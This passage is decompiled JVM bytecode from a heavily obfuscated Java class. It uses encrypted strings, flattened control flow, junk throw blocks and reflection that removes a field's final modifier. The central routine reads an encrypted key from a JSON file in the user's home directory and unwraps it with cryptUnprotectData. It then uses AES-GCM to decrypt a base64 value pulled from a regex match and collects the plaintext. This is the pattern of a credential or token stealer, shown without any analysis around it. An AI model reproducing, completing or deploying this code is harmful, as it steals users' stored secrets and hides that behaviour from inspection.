    //   2629: invokestatic forName : (Ljava/lang/String;)Ljava/lang/Class;
    //   2632: astore #49
    //   2634: ldc_w 'Wxx2LRkvanBNYANIRw=='
    //   2637: iload #168
    //   2639: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   2642: astore #118
    //   2644: aload #49
    //   2646: aload #118
    //   2648: invokevirtual getDeclaredField : (Ljava/lang/String;)Ljava/lang/reflect/Field;
    //   2651: astore #50
    //   2653: ldc_w 467375231
    //   2656: iload #168
    //   2658: ixor
    //   2659: i2b
    //   2660: istore #119
    //   2662: aload #50
    //   2664: iload #119
    //   2666: invokevirtual setAccessible : (Z)V
    //   2669: ldc_w java/lang/reflect/Field
    //   2672: astore #51
    //   2674: ldc_w 'UhZ0JQoqe1JR'
    //   2677: iload #168
    //   2679: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   2682: astore #120
    //   2684: aload #51
    //   2686: aload #120
    //   2688: invokevirtual getDeclaredField : (Ljava/lang/String;)Ljava/lang/reflect/Field;
    //   2691: astore #52
    //   2693: ldc_w 467375231
    //   2696: iload #168
    //   2698: ixor
    //   2699: i2b
    //   2700: istore #121
    //   2702: aload #52
    //   2704: iload #121
    //   2706: invokevirtual setAccessible : (Z)V
    //   2709: aload #50
    //   2711: invokevirtual getModifiers : ()I
    //   2714: istore #148
    //   2716: ldc_w -467375215
    //   2719: iload #168
    //   2721: ixor
    //   2722: i2b
    //   2723: istore_2
    //   2724: iload #148
    //   2726: iload_2
    //   2727: iand
    //   2728: istore #149
    //   2730: aload #52
    //   2732: aload #50
    //   2734: iload #149
    //   2736: invokevirtual setInt : (Ljava/lang/Object;I)V
    //   2739: aconst_null
    //   2740: astore #122
    //   2742: aload #50
    //   2744: aload #122
    //   2746: aload #43
    //   2748: invokevirtual set : (Ljava/lang/Object;Ljava/lang/Object;)V
    //   2751: iload #168
    //   2753: bipush #31
    //   2755: imul
    //   2756: iconst_4
    //   2757: iushr
    //   2758: iload #168
    //   2760: irem
    //   2761: iload #168
    //   2763: bipush #16
    //   2765: iushr
    //   2766: ixor
    //   2767: ldc_w 100234351
    //   2770: if_icmpne -> 6479
    //   2773: ldc_w 1316601673
    //   2776: iload #168
    //   2778: ixor
    //   2779: istore #168
    //   2781: goto -> 3283
    //   2784: aload #31
    //   2786: invokevirtual group : ()Ljava/lang/String;
    //   2789: astore #53
    //   2791: ldc_w 'Xi1iex18TkNyaj4U'
    //   2794: iload #168
    //   2796: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   2799: astore #123
    //   2801: aload #53
    //   2803: aload #123
    //   2805: invokevirtual split : (Ljava/lang/String;)[Ljava/lang/String;
    //   2808: astore #54
    //   2810: ldc_w 132013579
    //   2813: iload #168
    //   2815: ixor
    //   2816: i2b
    //   2817: istore #124
    //   2819: aload #54
    //   2821: iload #124
    //   2823: aaload
    //   2824: astore #55
    //   2826: aload #55
    //   2828: invokevirtual getBytes : ()[B
    //   2831: astore #56
    //   2833: new java/io/File
    //   2836: astore #57
    //   2838: new java/lang/StringBuilder
    //   2841: astore #150
    //   2843: aload #150
    //   2845: invokespecial <init> : ()V
    //   2848: ldc_w 'Tw9wPUQtdklP'
    //   2851: iload #168
    //   2853: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   2856: astore #158
    //   2858: aload #158
    //   2860: invokestatic getProperty : (Ljava/lang/String;)Ljava/lang/String;
    //   2863: astore #159
    //   2865: aload #150
    //   2867: aload #159
    //   2869: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   2872: astore #151
    //   2874: ldc_w 'Zj1lPy4kbUV2WwBPUAZ1XHtoaWQTV2RaYjRwLQkoPHFVbB9B'
    //   2877: iload #168
    //   2879: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   2882: astore #160
    //   2884: aload #151
    //   2886: aload #160
    //   2888: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   2891: astore #152
    //   2893: aload #152
    //   2895: invokevirtual toString : ()Ljava/lang/String;
    //   2898: astore #153
    //   2900: aload #57
    //   2902: aload #153
    //   2904: invokespecial <init> : (Ljava/lang/String;)V
    //   2907: aload #57
    //   2909: invokevirtual toPath : ()Ljava/nio/file/Path;
    //   2912: astore #58
    //   2914: new com/google/gson/Gson
    //   2917: astore #59
    //   2919: aload #59
    //   2921: invokespecial <init> : ()V
    //   2924: new java/lang/String
    //   2927: astore #125
    //   2929: aload #58
    //   2931: invokestatic readAllBytes : (Ljava/nio/file/Path;)[B
    //   2934: astore #161
    //   2936: aload #125
    //   2938: aload #161
    //   2940: invokespecial <init> : ([B)V
    //   2943: ldc_w com/google/gson/JsonObject
    //   2946: astore #154
    //   2948: aload #59
    //   2950: aload #125
    //   2952: aload #154
    //   2954: invokevirtual fromJson : (Ljava/lang/String;Ljava/lang/Class;)Ljava/lang/Object;
    //   2957: astore #60
    //   2959: aload #60
    //   2961: checkcast com/google/gson/JsonObject
    //   2964: astore #61
    //   2966: ldc_w 'VQ9KLBg8aVA='
    //   2969: iload #168
    //   2971: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   2974: astore #126
    //   2976: aload #61
    //   2978: aload #126
    //   2980: invokevirtual getAsJsonObject : (Ljava/lang/String;)Lcom/google/gson/JsonObject;
    //   2983: astore #62
    //   2985: ldc_w 'XxJ2PRM1bUFOVgRLRA=='
    //   2988: iload #168
    //   2990: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   2993: astore #127
    //   2995: aload #62
    //   2997: aload #127
    //   2999: invokevirtual get : (Ljava/lang/String;)Lcom/google/gson/JsonElement;
    //   3002: astore #63
    //   3004: aload #63
    //   3006: invokevirtual getAsString : ()Ljava/lang/String;
    //   3009: astore #64
    //   3011: aload #64
    //   3013: invokevirtual getBytes : ()[B
    //   3016: astore #65
    //   3018: invokestatic getDecoder : ()Ljava/util/Base64$Decoder;
    //   3021: astore #66
    //   3023: aload #66
    //   3025: aload #65
    //   3027: invokevirtual decode : ([B)[B
    //   3030: astore #67
    //   3032: ldc_w 132013583
    //   3035: iload #168
    //   3037: ixor
    //   3038: i2b
    //   3039: istore #128
    //   3041: aload #67
    //   3043: arraylength
    //   3044: istore #155
    //   3046: aload #67
    //   3048: iload #128
    //   3050: iload #155
    //   3052: invokestatic copyOfRange : ([BII)[B
    //   3055: astore #68
    //   3057: aload #68
    //   3059: invokestatic cryptUnprotectData : ([B)[B
    //   3062: astore #69
    //   3064: invokestatic getDecoder : ()Ljava/util/Base64$Decoder;
    //   3067: astore #70
    //   3069: aload #70
    //   3071: aload #56
    //   3073: invokevirtual decode : ([B)[B
    //   3076: astore #71
    //   3078: ldc_w 'ezlGYC0GVAtkZj9PWQtyVUA='
    //   3081: iload #168
    //   3083: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   3086: astore #72
    //   3088: aload #72
    //   3090: invokestatic getInstance : (Ljava/lang/String;)Ljavax/crypto/Cipher;
    //   3093: astore #73
    //   3095: ldc_w 132013576
    //   3098: iload #168
    //   3100: ixor
    //   3101: i2b
    //   3102: istore #129
    //   3104: new javax/crypto/spec/SecretKeySpec
    //   3107: astore #156
    //   3109: ldc_w 'ezlG'
    //   3112: iload #168
    //   3114: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   3117: astore_3
    //   3118: aload #156
    //   3120: aload #69
    //   3122: aload_3
    //   3123: invokespecial <init> : ([BLjava/lang/String;)V
    //   3126: new javax/crypto/spec/GCMParameterSpec
    //   3129: astore #162
    //   3131: ldc_w 132013706
    //   3134: iload #168
    //   3136: ixor
    //   3137: i2s
    //   3138: istore #165
    //   3140: ldc_w 132013577
    //   3143: iload #168
    //   3145: ixor
    //   3146: i2b
    //   3147: istore #4
    //   3149: ldc_w 132013573
    //   3152: iload #168
    //   3154: ixor
    //   3155: i2b
    //   3156: istore #5
    //   3158: aload #71
    //   3160: iload #4
    //   3162: iload #5
    //   3164: invokestatic copyOfRange : ([BII)[B
    //   3167: astore #166
    //   3169: aload #162
    //   3171: iload #165
    //   3173: aload #166
    //   3175: invokespecial <init> : (I[B)V
    //   3178: aload #73
    //   3180: iload #129
    //   3182: aload #156
    //   3184: aload #162
    //   3186: invokevirtual init : (ILjava/security/Key;Ljava/security/spec/AlgorithmParameterSpec;)V
    //   3189: ldc_w 132013573
    //   3192: iload #168
    //   3194: ixor
    //   3195: i2b
    //   3196: istore #157
    //   3198: aload #71
    //   3200: arraylength
    //   3201: istore #163
    //   3203: aload #71
    //   3205: iload #157
    //   3207: iload #163
    //   3209: invokestatic copyOfRange : ([BII)[B
    //   3212: astore #130
    //   3214: aload #73
    //   3216: aload #130
    //   3218: invokevirtual doFinal : ([B)[B
    //   3221: astore #74
    //   3223: new java/lang/String
    //   3226: astore #131
    //   3228: getstatic java/nio/charset/StandardCharsets.UTF_8 : Ljava/nio/charset/Charset;
    //   3231: astore #164
    //   3233: aload #131
    //   3235: aload #74
    //   3237: aload #164
    //   3239: invokespecial <init> : ([BLjava/nio/charset/Charset;)V
    //   3242: aload_1
    //   3243: aload #131
    //   3245: invokevirtual add : (Ljava/lang/Object;)Z
    //   3248: istore #75
    //   3250: iload #168
    //   3252: bipush #31
    //   3254: imul
    //   3255: iconst_4
    //   3256: iushr
    //   3257: iload #168
    //   3259: irem
    //   3260: iload #168
    //   3262: bipush #16
    //   3264: iushr
    //   3265: ixor
    //   3266: ldc_w 123764727
    //   3269: if_icmpne -> 6469
    //   3272: ldc_w 1539246386
    //   3275: iload #168
    //   3277: ixor
    //   3278: istore #168
    //   3280: goto -> 4817
    //   3283: iload #168
    //   3285: ldc_w 1436691240
    //   3288: iload #168
    //   3290: ixor
    //   3291: imul
    //   3292: ldc_w 1436691251
    //   3295: iload #168
    //   3297: ixor
    //   3298: iushr
    //   3299: iload #168
    //   3301: irem
    //   3302: iload #168
    //   3304: ldc_w 1436691239
    //   3307: iload #168
    //   3309: ixor
    //   3310: iushr
    //   3311: ixor
    //   3312: ldc_w 1346915631
    //   3315: iload #168
    //   3317: ixor
    //   3318: if_icmpeq -> 3345
    //   3321: aconst_null
    //   3322: athrow
    //   3323: nop
    //   3324: nop
    //   3325: nop
    //   3326: nop
    //   3327: nop
    //   3328: nop
    //   3329: nop
    //   3330: nop
    //   3331: nop
    //   3332: nop
    //   3333: nop
    //   3334: nop
    //   3335: nop
    //   3336: nop
    //   3337: nop
    //   3338: nop
    //   3339: nop
    //   3340: nop
    //   3341: nop
    //   3342: nop
    //   3343: nop
    //   3344: athrow
    //   3345: new java/lang/RuntimeException
    //   3348: dup
    //   3349: invokespecial <init> : ()V
    //   3352: athrow
    //   3353: nop
    //   3354: nop
    //   3355: nop
    //   3356: nop
    //   3357: nop
    //   3358: nop
    //   3359: nop
    //   3360: nop
    //   3361: nop
    //   3362: nop
    //   3363: nop
    //   3364: nop
    //   3365: nop
    //   3366: nop
    //   3367: nop
    //   3368: nop
    //   3369: nop
    //   3370: nop
    //   3371: nop
    //   3372: nop
    //   3373: nop
    //   3374: athrow
    //   3375: iload #168
    //   3377: bipush #7
    //   3379: bipush #29
    //   3381: ishl
    //   3382: iand
    //   3383: bipush #29
    //   3385: ishr
    //   3386: iload #168
    //   3388: iconst_3
    //   3389: ishl
    //   3390: ior
    //   3391: lookupswitch default -> 6333, -1391371846 -> 3427, -1118019653 -> 3416
    //   3416: ldc_w 751405358
    //   3419: iload #168
    //   3421: ixor
    //   3422: istore #168
    //   3424: goto -> 3435
    //   3427: ldc_w 247474670
    //   3430: iload #168
    //   3432: ixor
    //   3433: istore #168
    //   3435: pop
    //   3436: iload #168
    //   3438: bipush #31
    //   3440: imul
    //   3441: iconst_4
    //   3442: iushr
    //   3443: iload #168
    //   3445: irem
    //   3446: iload #168
    //   3448: bipush #16
    //   3450: iushr
    //   3451: ixor
    //   3452: ldc_w 17678054
    //   3455: if_icmpne -> 6345
    //   3458: ldc_w 1555848403
    //   3461: iload #168
    //   3463: ixor
    //   3464: istore #168
    //   3466: goto -> 2784
    //   3469: iload #168
    //   3471: ldc_w 72588491
    //   3474: iload #168
    //   3476: ixor
    //   3477: imul
    //   3478: ldc_w 72588496
    //   3481: iload #168
    //   3483: ixor
    //   3484: iushr
    //   3485: iload #168
    //   3487: irem
    //   3488: iload #168
    //   3490: ldc_w 72588484
    //   3493: iload #168
    //   3495: ixor
    //   3496: iushr
    //   3497: ixor
    //   3498: ldc_w 6159233
    //   3501: iload #168
    //   3503: ixor
    //   3504: if_icmpeq -> 3531
    //   3507: aconst_null
    //   3508: athrow
    //   3509: nop
    //   3510: nop
    //   3511: nop
    //   3512: nop
    //   3513: nop
    //   3514: nop
    //   3515: nop
    //   3516: nop
    //   3517: nop
    //   3518: nop
    //   3519: nop
    //   3520: nop
    //   3521: nop
    //   3522: nop
    //   3523: nop
    //   3524: nop
    //   3525: nop
    //   3526: nop
    //   3527: nop
    //   3528: nop
    //   3529: nop
    //   3530: athrow
    //   3531: new java/lang/RuntimeException
    //   3534: dup
    //   3535: invokespecial <init> : ()V
    //   3538: athrow
    //   3539: nop
    //   3540: nop
    //   3541: nop
    //   3542: nop
    //   3543: nop
    //   3544: nop
    //   3545: nop
    //   3546: nop
    //   3547: nop
    //   3548: nop
    //   3549: nop
    //   3550: nop
    //   3551: nop
    //   3552: nop
    //   3553: nop
    //   3554: nop
    //   3555: nop
    //   3556: nop
    //   3557: nop
    //   3558: nop
    //   3559: nop
    //   3560: athrow
    //   3561: iload #168
    //   3563: bipush #7
    //   3565: bipush #29
    //   3567: ishl
    //   3568: iand
    //   3569: bipush #29
    //   3571: ishr
    //   3572: iload #168
    //   3574: iconst_3
    //   3575: ishl
    //   3576: ior
    //   3577: lookupswitch default -> 6541, 384928417 -> 3615, 580708000 -> 3604
    //   3604: ldc_w 594565029
    //   3607: iload #168
    //   3609: ixor
    //   3610: istore #168
    //   3612: goto -> 3623
    //   3615: ldc_w 100530725
    //   3618: iload #168
    //   3620: ixor
    //   3621: istore #168
    //   3623: pop
    //   3624: iload #168
    //   3626: bipush #31
    //   3628: imul
    //   3629: iconst_4
    //   3630: iushr
    //   3631: iload #168
    //   3633: irem
    //   3634: iload #168
    //   3636: bipush #16
    //   3638: iushr
    //   3639: ixor
    //   3640: ldc_w 198540553
    //   3643: if_icmpne -> 6553
    //   3646: ldc_w 399431797
    //   3649: iload #168
    //   3651: ixor
    //   3652: istore #168
    //   3654: goto -> 2010
    //   3657: iload #168
    //   3659: ldc_w 372708082
    //   3662: iload #168
    //   3664: ixor
    //   3665: imul
    //   3666: ldc_w 372708073
    //   3669: iload #168
    //   3671: ixor
    //   3672: iushr
    //   3673: iload #168
    //   3675: irem
    //   3676: iload #168
    //   3678: ldc_w 372708093
    //   3681: iload #168
    //   3683: ixor
    //   3684: iushr
    //   3685: ixor
    //   3686: ldc_w 490582129
    //   3689: iload #168
    //   3691: ixor
    //   3692: if_icmpeq -> 3719
    //   3695: aconst_null
    //   3696: athrow
    //   3697: nop
    //   3698: nop
    //   3699: nop
    //   3700: nop
    //   3701: nop
    //   3702: nop
    //   3703: nop
    //   3704: nop
    //   3705: nop
    //   3706: nop
    //   3707: nop
    //   3708: nop
    //   3709: nop
    //   3710: nop
    //   3711: nop
    //   3712: nop
    //   3713: nop
    //   3714: nop
    //   3715: nop
    //   3716: nop
    //   3717: nop
    //   3718: athrow
    //   3719: new java/io/IOException
    //   3722: dup
    //   3723: invokespecial <init> : ()V
    //   3726: athrow
    //   3727: nop
    //   3728: nop
    //   3729: nop
    //   3730: nop
    //   3731: nop
    //   3732: nop
    //   3733: nop
    //   3734: nop
    //   3735: nop
    //   3736: nop
    //   3737: nop
    //   3738: nop
    //   3739: nop
    //   3740: nop
    //   3741: nop
    //   3742: nop
    //   3743: nop
    //   3744: nop
    //   3745: nop
    //   3746: nop
    //   3747: nop
    //   3748: athrow
    //   3749: iload #168
    //   3751: bipush #7
    //   3753: bipush #29
    //   3755: ishl
    //   3756: iand
    //   3757: bipush #29
    //   3759: ishr
    //   3760: iload #168
    //   3762: iconst_3
    //   3763: ishl
    //   3764: ior
    //   3765: lookupswitch default -> 6239, -1313302680 -> 3803, 633330473 -> 3792
    //   3792: ldc_w 1127664704
    //   3795: iload #168
    //   3797: ixor
    //   3798: istore #168
    //   3800: goto -> 3811
    //   3803: ldc_w 1907762632
    //   3806: iload #168
    //   3808: ixor
    //   3809: istore #168
    //   3811: pop
    //   3812: iload #168
    //   3814: bipush #31
    //   3816: imul
    //   3817: iconst_4
    //   3818: iushr
    //   3819: iload #168
    //   3821: irem
    //   3822: iload #168
    //   3824: bipush #16
    //   3826: iushr
    //   3827: ixor
    //   3828: ldc_w 143277398
    //   3831: if_icmpne -> 6229
    //   3834: ldc_w 1627740861
    //   3837: iload #168
    //   3839: ixor
    //   3840: istore #168
    //   3842: goto -> 2077
    //   3845: iload #168
    //   3847: ldc_w 2019190160
    //   3850: iload #168
    //   3852: ixor
    //   3853: imul
    //   3854: ldc_w 2019190155
    //   3857: iload #168
    //   3859: ixor
    //   3860: iushr
    //   3861: iload #168
    //   3863: irem
    //   3864: iload #168
    //   3866: ldc_w 2019190175
    //   3869: iload #168
    //   3871: ixor
    //   3872: iushr
    //   3873: ixor
    //   3874: ldc_w 1903507728
    //   3877: iload #168
    //   3879: ixor
    //   3880: if_icmpeq -> 3907
    //   3883: aconst_null
    //   3884: athrow
    //   3885: nop
    //   3886: nop
    //   3887: nop
    //   3888: nop
    //   3889: nop
    //   3890: nop
    //   3891: nop
    //   3892: nop
    //   3893: nop
    //   3894: nop
    //   3895: nop
    //   3896: nop
    //   3897: nop
    //   3898: nop
    //   3899: nop
    //   3900: nop
    //   3901: nop
    //   3902: nop
    //   3903: nop
    //   3904: nop
    //   3905: nop
    //   3906: athrow
    //   3907: new java/lang/RuntimeException
    //   3910: dup
    //   3911: invokespecial <init> : ()V
    //   3914: athrow
    //   3915: nop
    //   3916: nop
    //   3917: nop
    //   3918: nop
    //   3919: nop
    //   3920: nop
    //   3921: nop
    //   3922: nop
    //   3923: nop
    //   3924: nop
    //   3925: nop
    //   3926: nop
    //   3927: nop
    //   3928: nop
    //   3929: nop
    //   3930: nop
    //   3931: nop
    //   3932: nop
    //   3933: nop
    //   3934: nop
    //   3935: nop
    //   3936: athrow
    //   3937: iload #168
    //   3939: bipush #7
    //   3941: bipush #29
    //   3943: ishl
    //   3944: iand
    //   3945: bipush #29
    //   3947: ishr
    //   3948: iload #168
    //   3950: iconst_3
    //   3951: ishl
    //   3952: ior
    //   3953: lookupswitch default -> 6427, -1265744325 -> 3991, -1026347909 -> 3980
    //   3980: ldc_w 440674209
    //   3983: iload #168
    //   3985: ixor
    //   3986: istore #168
    //   3988: goto -> 3999
    //   3991: ldc_w 344951529
    //   3994: iload #168
    //   3996: ixor
    //   3997: istore #168
    //   3999: pop
    //   4000: iload #168
    //   4002: bipush #31
    //   4004: imul
    //   4005: iconst_4
    //   4006: iushr
    //   4007: iload #168
    //   4009: irem
    //   4010: iload #168
    //   4012: bipush #16
    //   4014: iushr
    //   4015: ixor
    //   4016: ldc_w 236634663
    //   4019: if_icmpne -> 6439
    //   4022: ldc_w 1687826358
    //   4025: iload #168
    //   4027: ixor
    //   4028: istore #168
    //   4030: goto -> 2077
    //   4033: ldc_w 814632777
    //   4036: iload #168
    //   4038: ixor
    //   4039: istore #168
    //   4041: goto -> 2784
    //   4044: iload #168
    //   4046: ldc_w 784686574
    //   4049: iload #168
    //   4051: ixor
    //   4052: imul
    //   4053: ldc_w 784686581
    //   4056: iload #168
    //   4058: ixor
    //   4059: iushr
    //   4060: iload #168
    //   4062: irem
    //   4063: iload #168
    //   4065: ldc_w 784686561
    //   4068: iload #168
    //   4070: ixor
    //   4071: iushr
    //   4072: ixor
    //   4073: ldc_w 609948982
    //   4076: iload #168
    //   4078: ixor
    //   4079: if_icmpeq -> 4106
    //   4082: aconst_null
    //   4083: athrow
    //   4084: nop
    //   4085: nop
    //   4086: nop
    //   4087: nop
    //   4088: nop
    //   4089: nop
    //   4090: nop
    //   4091: nop
    //   4092: nop
    //   4093: nop
    //   4094: nop
    //   4095: nop
    //   4096: nop
    //   4097: nop
    //   4098: nop
    //   4099: nop
    //   4100: nop
    //   4101: nop
    //   4102: nop
    //   4103: nop
    //   4104: nop
    //   4105: athrow
    //   4106: new java/io/IOException
    //   4109: dup
    //   4110: invokespecial <init> : ()V
    //   4113: athrow
    //   4114: nop
    //   4115: nop
    //   4116: nop
    //   4117: nop
    //   4118: nop
    //   4119: nop
    //   4120: nop
    //   4121: nop
    //   4122: nop
    //   4123: nop
    //   4124: nop
    //   4125: nop
    //   4126: nop
    //   4127: nop
    //   4128: nop
    //   4129: nop
    //   4130: nop
    //   4131: nop
    //   4132: nop
    //   4133: nop
    //   4134: nop
    //   4135: athrow
    //   4136: iload #168
    //   4138: bipush #7
    //   4140: bipush #29
    //   4142: ishl
    //   4143: iand
    //   4144: bipush #29
    //   4146: ishr
    //   4147: iload #168
    //   4149: iconst_3
    //   4150: ishl
    //   4151: ior
    //   4152: lookupswitch default -> 6271, -1574667903 -> 4191, 1982525321 -> 4180
    //   4180: ldc_w 1212407045
    //   4183: iload #168
    //   4185: ixor
    //   4186: istore #168
    //   4188: goto -> 4199
    //   4191: ldc_w 1388449732
    //   4194: iload #168
    //   4196: ixor
    //   4197: istore #168
    //   4199: pop
    //   4200: iload #168
    //   4202: bipush #31
    //   4204: imul
    //   4205: iconst_4
    //   4206: iushr
    //   4207: iload #168
    //   4209: irem
    //   4210: iload #168
    //   4212: bipush #16
    //   4214: iushr
    //   4215: ixor
    //   4216: ldc_w 111476574
    //   4219: if_icmpne -> 6283
    //   4222: ldc_w 1373016503
    //   4225: iload #168
    //   4227: ixor
    //   4228: istore #168
    //   4230: goto -> 2258
    //   4233: ldc_w 144409932
    //   4236: iload #168
    //   4238: ixor
    //   4239: istore #168
    //   4241: goto -> 2164
    //   4244: ldc_w 2034981030
    //   4247: iload #168
    //   4249: ixor
    //   4250: istore #168
    //   4252: goto -> 2010
    //   4255: iload #168
    //   4257: ldc_w 1763530468
    //   4260: iload #168
    //   4262: ixor
    //   4263: imul
    //   4264: ldc_w 1763530495
    //   4267: iload #168
    //   4269: ixor
    //   4270: iushr
    //   4271: iload #168
    //   4273: irem
    //   4274: iload #168
    //   4276: ldc_w 1763530475
    //   4279: iload #168
    //   4281: ixor
    //   4282: iushr
    //   4283: ixor
    //   4284: ldc_w 1656088416
    //   4287: iload #168
    //   4289: ixor
    //   4290: if_icmpeq -> 4317
    //   4293: aconst_null
    //   4294: athrow
    //   4295: nop
    //   4296: nop
    //   4297: nop
    //   4298: nop
    //   4299: nop
    //   4300: nop
    //   4301: nop
    //   4302: nop
    //   4303: nop
    //   4304: nop
    //   4305: nop
    //   4306: nop
    //   4307: nop
    //   4308: nop
    //   4309: nop
    //   4310: nop
    //   4311: nop
    //   4312: nop
    //   4313: nop
    //   4314: nop
    //   4315: nop
    //   4316: athrow
    //   4317: new java/lang/RuntimeException
    //   4320: dup
    //   4321: invokespecial <init> : ()V
    //   4324: athrow
    //   4325: nop
    //   4326: nop
    //   4327: nop
    //   4328: nop
    //   4329: nop
    //   4330: nop
    //   4331: nop
    //   4332: nop
    //   4333: nop
    //   4334: nop
    //   4335: nop
    //   4336: nop
    //   4337: nop
    //   4338: nop
    //   4339: nop
    //   4340: nop
    //   4341: nop
    //   4342: nop
    //   4343: nop
    //   4344: nop
    //   4345: nop
    //   4346: athrow
    //   4347: iload #168
    //   4349: bipush #7
    //   4351: bipush #29
    //   4353: ishl
    //   4354: iand
    //   4355: bipush #29
    //   4357: ishr
    //   4358: iload #168
    //   4360: iconst_3
    //   4361: ishl
    //   4362: ior
    //   4363: lookupswitch default -> 6405, 255485321 -> 4399, 1223342043 -> 4388
    //   4388: ldc_w 298060825
    //   4391: iload #168
    //   4393: ixor
    //   4394: istore #168
    //   4396: goto -> 4407
    //   4399: ldc_w 1497241171
    //   4402: iload #168
    //   4404: ixor
    //   4405: istore #168
    //   4407: pop
    //   4408: iload #168
    //   4410: bipush #31
    //   4412: imul
    //   4413: iconst_4
    //   4414: iushr
    //   4415: iload #168
    //   4417: irem
    //   4418: iload #168
    //   4420: bipush #16
    //   4422: iushr
    //   4423: ixor
    //   4424: ldc_w 170219724
    //   4427: if_icmpne -> 6417
    //   4430: ldc_w 1661128348
    //   4433: iload #168
    //   4435: ixor
    //   4436: istore #168
    //   4438: goto -> 2324
    //   4441: iload #168
    //   4443: ldc_w 2136030719
    //   4446: iload #168
    //   4448: ixor
    //   4449: imul
    //   4450: ldc_w 2136030692
    //   4453: iload #168
    //   4455: ixor
    //   4456: iushr
    //   4457: iload #168
    //   4459: irem
    //   4460: iload #168
    //   4462: ldc_w 2136030704
    //   4465: iload #168
    //   4467: ixor
    //   4468: iushr
    //   4469: ixor
    //   4470: ldc_w 2046567763
    //   4473: iload #168
    //   4475: ixor
    //   4476: if_icmpeq -> 4503
    //   4479: aconst_null
    //   4480: athrow
    //   4481: nop
    //   4482: nop
    //   4483: nop
    //   4484: nop
    //   4485: nop
    //   4486: nop
    //   4487: nop
    //   4488: nop
    //   4489: nop
    //   4490: nop
    //   4491: nop
    //   4492: nop
    //   4493: nop
    //   4494: nop
    //   4495: nop
    //   4496: nop
    //   4497: nop
    //   4498: nop
    //   4499: nop
    //   4500: nop
    //   4501: nop
    //   4502: athrow
    //   4503: new java/lang/IllegalAccessException
    //   4506: dup
    //   4507: invokespecial <init> : ()V
    //   4510: athrow
    //   4511: nop
    //   4512: nop
    //   4513: nop
    //   4514: nop
    //   4515: nop
    //   4516: nop
    //   4517: nop
    //   4518: nop
    //   4519: nop
    //   4520: nop
    //   4521: nop
    //   4522: nop
    //   4523: nop
    //   4524: nop
    //   4525: nop
    //   4526: nop
    //   4527: nop
    //   4528: nop
    //   4529: nop
    //   4530: nop
    //   4531: nop
    //   4532: athrow
    //   4533: iload #168
    //   4535: bipush #7
    //   4537: bipush #29
    //   4539: ishl
    //   4540: iand
    //   4541: bipush #29
    //   4543: ishr
    //   4544: iload #168
    //   4546: iconst_3
    //   4547: ishl
    //   4548: ior
    //   4549: lookupswitch default -> 6875, -91623677 -> 4576, 669669842 -> 4587
    //   4576: ldc_w 2054692333
    //   4579: iload #168
    //   4581: ixor
    //   4582: istore #168
    //   4584: goto -> 4595
    //   4587: ldc_w 1104440119
    //   4590: iload #168
    //   4592: ixor
    //   4593: istore #168
    //   4595: pop
    //   4596: iload #168
    //   4598: bipush #31
    //   4600: imul
    //   4601: iconst_4
    //   4602: iushr
    //   4603: iload #168
    //   4605: irem
    //   4606: iload #168
    //   4608: bipush #16
    //   4610: iushr
    //   4611: ixor
    //   4612: ldc_w 81169189
    //   4615: if_icmpne -> 6887
    //   4618: ldc_w 1635647538
    //   4621: iload #168
    //   4623: ixor
    //   4624: istore #168
    //   4626: goto -> 1940
    //   4629: iload #168
    //   4631: ldc_w 206492517
    //   4634: iload #168
    //   4636: ixor
    //   4637: imul
    //   4638: ldc_w 206492542
    //   4641: iload #168
    //   4643: ixor
    //   4644: iushr
    //   4645: iload #168
    //   4647: irem
    //   4648: iload #168
    //   4650: ldc_w 206492522
    //   4653: iload #168
    //   4655: ixor
    //   4656: iushr
    //   4657: ixor
    //   4658: ldc_w 194406024
    //   4661: iload #168
    //   4663: ixor
    //   4664: if_icmpeq -> 4691
    //   4667: aconst_null
    //   4668: athrow
    //   4669: nop
    //   4670: nop
    //   4671: nop
    //   4672: nop
    //   4673: nop
    //   4674: nop
    //   4675: nop
    //   4676: nop
    //   4677: nop
    //   4678: nop
    //   4679: nop
    //   4680: nop
    //   4681: nop
    //   4682: nop
    //   4683: nop
    //   4684: nop
    //   4685: nop
    //   4686: nop
    //   4687: nop
    //   4688: nop
    //   4689: nop
    //   4690: athrow
    //   4691: new java/lang/RuntimeException
    //   4694: dup
    //   4695: invokespecial <init> : ()V
    //   4698: athrow
    //   4699: nop
    //   4700: nop
    //   4701: nop
    //   4702: nop
    //   4703: nop
    //   4704: nop
    //   4705: nop
    //   4706: nop
    //   4707: nop
    //   4708: nop
    //   4709: nop
    //   4710: nop
    //   4711: nop
    //   4712: nop
    //   4713: nop
    //   4714: nop
    //   4715: nop
    //   4716: nop
    //   4717: nop
    //   4718: nop
    //   4719: nop
    //   4720: athrow
    //   4721: iload #168
    //   4723: bipush #7
    //   4725: bipush #29
    //   4727: ishl
    //   4728: iand
    //   4729: bipush #29
    //   4731: ishr
    //   4732: iload #168
    //   4734: iconst_3
    //   4735: ishl
    //   4736: ior
    //   4737: lookupswitch default -> 6489, 159580896 -> 4764, 1651940304 -> 4775
    //   4764: ldc_w 431002814
    //   4767: iload #168
    //   4769: ixor
    //   4770: istore #168
    //   4772: goto -> 4783
    //   4775: ldc_w 349054872
    //   4778: iload #168
    //   4780: ixor
    //   4781: istore #168
    //   4783: pop
    //   4784: iload #168
    //   4786: bipush #31
    //   4788: imul
    //   4789: iconst_4
    //   4790: iushr
    //   4791: iload #168
    //   4793: irem
    //   4794: iload #168
    //   4796: bipush #16
    //   4798: iushr
    //   4799: ixor
    //   4800: ldc_w 259638005
    //   4803: if_icmpne -> 6501
    //   4806: ldc_w 1262467507
    //   4809: iload #168
    //   4811: ixor
    //   4812: istore #168
    //   4814: goto -> 2122
    //   4817: iload #168
    //   4819: ldc_w 1549883175
    //   4822: iload #168
    //   4824: ixor
